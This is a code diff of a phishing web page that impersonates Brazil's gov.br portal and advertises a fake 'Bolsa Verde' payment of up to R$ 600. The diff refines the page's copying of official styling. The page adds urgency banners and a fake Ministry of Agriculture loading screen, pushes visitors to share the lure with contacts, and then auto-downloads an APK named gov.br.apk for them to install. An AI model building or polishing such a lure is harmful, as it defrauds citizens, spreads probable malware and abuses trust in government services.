@@ -2,105 +2,316 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>gov.br – Bolsa Verde</title>
+<title>Bolsa Verde - Portal Gov.br</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- Fonte Roboto (Padrão Gov.br) -->
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<!-- Ícones -->
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
 <style>
-  body{font-family:'Roboto',sans-serif;margin:0;padding:0;background:#f4f4f4;color:#333;}
-  header{background:#004d00;padding:20px 0;text-align:center;color:#fff;}
-  .hero{background:#e0f2e9;padding:60px 20px;text-align:center;}
-  .hero h1{font-size:2.5rem;margin:0.5rem 0;color:#004d00;}
-  .hero p{font-size:1.1rem;margin:1rem 0;color:#006600;}
-  .cta{padding:15px 30px;font-size:1.2rem;background:#006600;color:#fff;border:none;border-radius:5px;cursor:pointer;}
-  .cta i{margin-right:8px;}
-  .cta:hover{background:#004d00;}
-  .urgency{display:block;font-size:0.9rem;color:#d8000c;margin-bottom:15px;}
-  .money{font-size:1.8rem;color:#006600;font-weight:700;}
-  /* Modals */
-  #shareModal, #loadingModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);justify-content:center;align-items:center;z-index:1000;}
-  #shareModal .modal-content, #loadingModal .modal-content{background:#fff;padding:20px;border-radius:8px;text-align:center;max-width:400px;width:90%;}
-  .share-icon{font-size:3rem;color:#006600;margin-bottom:10px;}
-  .share-buttons{display:flex;gap:15px;margin:15px 0;}
-  .share-buttons button{flex:1;padding:10px;font-size:1rem;border:none;border-radius:5px;cursor:pointer;color:#fff;}
-  .share-buttons button.facebook{background:#3b5998;}
-  .share-buttons button.whatsapp{background:#25d366;}
-  .share-buttons button.instagram{background:#c13584;}
-  .confirm{background:#006600;color:#fff;padding:10px 20px;border:none;border-radius:5px;margin-top:10px;cursor:pointer;}
-  .confirm:hover{background:#004d00;}
-  /* Spinner */
-  .spinner{border:6px solid #f3f3f3;border-top:6px solid #006600;border-radius:50%;width:60px;height:60px;margin:0 auto 20px;animation:spin 1s linear infinite;}
-  @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-  .sub-loading{font-size:0.9rem;color:#555;}
+  /* RESET E BASE */
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background-color: #f4f6f8; /* Cinza muito claro, padrão gov.br */
+    color: #333;
+    line-height: 1.5;
+  }
+
+  /* CABEÇALO GOV.BR OFICIAL (Simulado) */
+  header {
+    background-color: #fff;
+    border-bottom: 4px solid #003f6e; /* Azul Escuro Gov */
+    padding: 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  }
+  .gov-logo {
+    font-size: 1.4rem;
+    font-weight: 700;
+    color: #003f6e;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .gov-logo span { color: #ff9900; /* O toque amarelo do logo */ }
+  .gov-badge {
+    font-size: 0.8rem;
+    color: #666;
+    background: #eef2f5;
+    padding: 4px 8px;
+    border-radius: 4px;
+  }
+
+  /* HERO SECTION */
+  .hero {
+    background: linear-gradient(135deg, #003f6e 0%, #005b96 100%); /* Gradiente Azul Gov */
+    color: white;
+    padding: 60px 20px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+  
+  /* Elemento decorativo verde (Bolsa Verde) */
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -50px; right: -50px;
+    width: 200px; height: 200px;
+    background: rgba(46, 125, 50, 0.2); /* Verde transparente */
+    border-radius: 50%;
+  }
+
+  .hero h1 {
+    font-size: 2.2rem;
+    margin-bottom: 15px;
+    color: #fff;
+    font-weight: 700;
+  }
+  
+  .hero p {
+    font-size: 1.1rem;
+    max-width: 700px;
+    margin: 0 auto 25px auto;
+    opacity: 0.9;
+  }
+
+  /* ALERTA DE URGÊNCIA */
+  .urgency-banner {
+    background-color: #fff3cd; /* Amarelo alerta suave */
+    color: #856404;
+    padding: 10px;
+    text-align: center;
+    font-size: 0.9rem;
+    font-weight: 500;
+    border-bottom: 1px solid #ffeeba;
+    margin-top: -20px; /* Sobe para o topo do hero */
+    position: relative;
+    z-index: 10;
+    display: inline-block;
+    padding: 8px 20px;
+    border-radius: 4px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+  }
+
+  /* BOTÃO CTA */
+  .cta-btn {
+    background-color: #2E7D32; /* Verde Bolsa Verde Oficial */
+    color: white;
+    border: none;
+    padding: 16px 35px;
+    font-size: 1.1rem;
+    font-weight: 600;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+    display: inline-flex;
+    align-items: center;
+    gap: 10px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+
+  .cta-btn:hover {
+    background-color: #1b5e20; /* Verde mais escuro no hover */
+    transform: translateY(-2px);
+    box-shadow: 0 6px 8px rgba(0,0,0,0.3);
+  }
+
+  .money-highlight {
+    color: #ff9900; /* Destaque em amarelo ouro */
+    font-weight: 700;
+    background: rgba(255,255,255,0.1);
+    padding: 2px 8px;
+    border-radius: 4px;
+  }
+
+  /* MODAIS */
+  #shareModal, #loadingModal {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0, 63, 110, 0.85); /* Azul escuro transparente */
+    justify-content: center;
+    align-items: center;
+    z-index: 2000;
+    backdrop-filter: blur(3px);
+  }
+
+  .modal-card {
+    background: #fff;
+    padding: 30px;
+    border-radius: 8px;
+    text-align: center;
+    max-width: 400px;
+    width: 90%;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    border-top: 5px solid #2E7D32; /* Borda verde no modal */
+    animation: slideUp 0.4s ease-out;
+  }
+
+  @keyframes slideUp {
+    from { transform: translateY(50px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  .modal-title {
+    color: #003f6e;
+    font-size: 1.4rem;
+    margin-bottom: 15px;
+    font-weight: 700;
+  }
+
+  .modal-text {
+    color: #555;
+    font-size: 0.95rem;
+    margin-bottom: 20px;
+  }
+
+  .share-grid {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 20px;
+  }
+
+  .btn-share {
+    flex: 1;
+    border: none;
+    padding: 10px;
+    border-radius: 4px;
+    color: white;
+    font-weight: 500;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: opacity 0.2s;
+  }
+  .btn-share:hover { opacity: 0.9; }
+  .fb { background-color: #3b5998; }
+  .wa { background-color: #25d366; }
+  .ig { background-color: #c13584; }
+
+  .btn-confirm {
+    width: 100%;
+    padding: 12px;
+    background-color: #003f6e; /* Azul Gov */
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-weight: 600;
+    cursor: pointer;
+    font-size: 1rem;
+  }
+  .btn-confirm:hover { background-color: #002d4e; }
+
+  /* SPINNER */
+  .spinner-box { margin-bottom: 20px; }
+  .spinner {
+    border: 5px solid #f3f3f3;
+    border-top: 5px solid #2E7D32;
+    border-radius: 50%;
+    width: 50px; height: 50px;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+  }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  .loading-text { color: #555; font-size: 0.9rem; }
 </style>
 </head>
 <body>
 
+<!-- CABEÇALHO -->
 <header>
-  <h1>gov.br – Bolsa Verde</h1>
+  <div class="gov-logo">
+    <i class="fas fa-globe-americas"></i> gov.br <span>Brasil</span>
+  </div>
+  <div class="gov-badge">Acesso Único</div>
 </header>
 
+<!-- HERO SECTION -->
 <section class="hero">
-  <div class="container">
-    <span class="urgency">⚠️ ATENÇÃO: INÍCIO DOS PAGAMENTOS</span>
-    <h1>Bolsa Verde: Novo Auxílio para Quem Tem Terra</h1>
-    <p>Verifique agora se você tem direito ao novo benefício do governo. O pagamento de até <span class="money">R$ 600,00</span> pode cair na sua conta ainda hoje.</p>
-    <button id="downloadBtn" class="cta"><i class="fas fa-tree"></i> Verificar Elegibilidade Agora</button>
+  <div class="container" style="position: relative; z-index: 2;">
+    <!-- Banner de alerta amarelo/aviso -->
+    <div class="urgency-banner">
+      <i class="fas fa-exclamation-circle"></i> ATENÇÃO: INÍCIO DOS PAGAMENTOS DA ETAPA 1
+    </div>
+    
+    <h1>Bolsa Verde</h1>
+    <p>Confira se você tem direito ao novo benefício do governo federal. O valor de até <span class="money-highlight">R$ 600,00</span> pode ser liberado ainda hoje.</p>
+    
+    <button id="downloadBtn" class="cta-btn">
+      <i class="fas fa-file-download"></i> Verificar Elegibilidade
+    </button>
   </div>
 </section>
 
 <!-- MODAL DE COMPARTILHAR -->
 <div id="shareModal">
-  <i class="fas fa-share-alt share-icon"></i>
-  <h3>Liberar Download</h3>
-  <p style="font-size:14px;color:#555;margin-bottom:20px;">
-    Compartilhe com mais <strong>2 pessoas</strong> para validar seu cadastro no Bolsa Verde.
-  </p>
-  <div class="share-buttons">
-    <button id="shareFb" class="facebook"><i class="fab fa-facebook-f"></i> Facebook</button>
-    <button id="shareWa" class="whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</button>
-    <button id="shareIg" class="instagram"><i class="fab fa-instagram"></i> Instagram</button>
+  <div class="modal-card">
+    <div style="font-size: 3rem; color: #2E7D32; margin-bottom: 10px;">
+      <i class="fas fa-share-nodes"></i>
+    </div>
+    <h3 class="modal-title">Validar Cadastro</h3>
+    <p class="modal-text">Para liberar o pagamento, o sistema precisa que você compartilhe este aviso com <strong>2 contatos</strong>.</p>
+    
+    <div class="share-grid">
+      <button id="shareFb" class="btn-share fb"><i class="fab fa-facebook-f"></i></button>
+      <button id="shareWa" class="btn-share wa"><i class="fab fa-whatsapp"></i></button>
+      <button id="shareIg" class="btn-share ig"><i class="fab fa-instagram"></i></button>
+    </div>
+    
+    <button class="btn-confirm" id="btnConfirmShare">Já fiz o compartilhamento</button>
   </div>
-  <button class="confirm" id="btnConfirmShare">Já compartilhei (2/2)</button>
 </div>
 
 <!-- MODAL DE CARREGAMENTO -->
 <div id="loadingModal">
-  <div class="spinner"></div>
-  <div class="loading">Conectando ao Ministério da Agricultura...</div>
-  <div class="sub-loading">Verificando cadastro rural e CPF</div>
+  <div class="modal-card">
+    <div class="spinner-box">
+      <div class="spinner"></div>
+    </div>
+    <h3 class="modal-title" style="color: #003f6e;">Consultando Base</h3>
+    <p class="loading-text">Conectando ao Ministério da Agricultura...</p>
+    <p class="loading-text" style="font-size: 0.8rem; color: #888; margin-top:5px;">Validando CPF e Cadastro Rural</p>
+  </div>
 </div>
 
 <script>
 /* ================================
-   1️⃣ Dados de Compartilhamento
+   LÓGICA DO SITE
    ================================ */
-const shareUrl = "https://seusite.com/";          // URL da página (não do APK)
-const shareText = `Olá, cidadão.\n\nO Ministério da Agricultura acaba de anunciar o início das liberações do Bolsa Verde. Devido à alta demanda, o sistema de validação biométrica foi ativado exclusivamente via aplicativo móvel para agilizar os pagamentos.\n\nAtenção: Se você possui cadastro rural ou terras no nome, há uma chance real de receber até R$ 600,00 na sua conta corrente ainda esta semana.\n\nO prazo para validação da sua elegibilidade encerra-se em 24 horas. Após esse período, o benefício será cancelado automaticamente.\n\n👉 Clique aqui para baixar o App Oficial e liberar seu valor: ${shareUrl}\n\nDica: Baixe e siga passo a passo ou procure algum especialista antes que a fila de espera aumente.\n\nAtenciosamente,\nEquipe Gov.br - Acesso Único`;
 
-/* ================================
-   2️⃣ Funções de Compartilhamento
-   ================================ */
-function encode(str){return encodeURIComponent(str);}
-function shareFacebook(){window.open(`https://www.facebook.com/sharer/sharer.php?u=${encode(shareUrl)}&quote=${encode(shareText)}`,'_blank','width=650,height=450');}
-function shareWhatsApp(){window.open(`https://api.whatsapp.com/send?text=${encode(shareText)}%20${encode(shareUrl)}`,'_blank');}
-function shareInstagram(){window.open(shareUrl,'_blank');}
+// Configurações de Texto
+const shareUrl = window.location.href; // Pega a URL atual automaticamente
+const shareText = `Olá! O Ministério da Agricultura anunciou o início do pagamento do Bolsa Verde. Se você tem terra no nome, pode receber até R$ 600,00. Verifique agora: ${shareUrl}`;
 
-/* ================================
-   3️⃣ Download Local (APK na mesma pasta)
-   ================================ */
-function forceDownload(){
+// Funções de Share
+function encode(str){ return encodeURIComponent(str); }
+function shareFacebook(){ window.open(`https://www.facebook.com/sharer/sharer.php?u=${encode(shareUrl)}`, '_blank', 'width=650,height=450'); }
+function shareWhatsApp(){ window.open(`https://api.whatsapp.com/send?text=${encode(shareText)}`, '_blank'); }
+function shareInstagram(){ window.open(shareUrl, '_blank'); }
+
+// Download do APK (mesma pasta)
+function forceDownload() {
   const a = document.createElement('a');
-  a.href = 'gov.br.apk';          // <‑ caminho relativo
-  a.download = '';                // deixa o navegador usar o nome original
+  a.href = 'gov.br.apk'; // Nome do arquivo deve estar na mesma pasta
+  a.download = 'gov.br.apk';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
 }
 
-/* ================================
-   4️⃣ Eventos
-   ================================ */
+// Event Listeners
 document.getElementById('shareFb').onclick = shareFacebook;
 document.getElementById('shareWa').onclick = shareWhatsApp;
 document.getElementById('shareIg').onclick = shareInstagram;
@@ -113,18 +324,23 @@ document.getElementById('downloadBtn').onclick = function(e){
 document.getElementById('btnConfirmShare').onclick = function(){
   document.getElementById('shareModal').style.display = 'none';
   document.getElementById('loadingModal').style.display = 'flex';
-  setTimeout(()=>{
-    forceDownload();                                   // <-- inicia download
+  
+  // Simula tempo de carregamento
+  setTimeout(() => {
+    forceDownload();
     document.getElementById('loadingModal').style.display = 'none';
     alert('Arquivo baixado com sucesso! Abra para instalar.');
-  },2000);
+  }, 2500);
 };
 
-/* ================================
-   5️⃣ Dinamismo do Valor
-   ================================ */
-const moneyEl = document.querySelector('.money');
-setInterval(()=>{moneyEl.textContent = `R$ ${Math.random()>0.7?'600':'615'}.00`;},2500);
+// Efeito dinâmico no valor (opcional, mas chama atenção)
+const moneyEl = document.querySelector('.money-highlight');
+setInterval(() => {
+  // Alterna entre R$ 600 e R$ 615 aleatoriamente para parecer "ao vivo"
+  const randomVal = Math.random() > 0.5 ? '600' : '615'; 
+  moneyEl.textContent = `R$ ${randomVal},00`;
+}, 3000);
+
 </script>
 </body>
 </html>
